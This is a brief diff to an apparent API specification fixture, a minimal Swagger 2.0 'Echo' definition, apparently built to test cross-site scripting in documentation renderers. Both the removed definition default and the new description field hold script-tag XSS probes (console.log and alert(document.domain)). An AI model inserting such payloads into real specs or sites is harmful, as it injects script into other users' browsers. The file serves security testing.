@@ -1,4 +1,11 @@
-Definitions   
-    Type: string   
-    Description: prints xss   
-    Default: <script>console.log(‘000000000000000000dad0000000000000000000');</script>
+swagger: '2.0'
+info:
+  version: 1.0.0
+  title: Echo
+  description: '<script>alert(document.domain)</script>'
+paths:
+  /:
+    get:
+      responses:
+        '200':
+          description: Echo GET
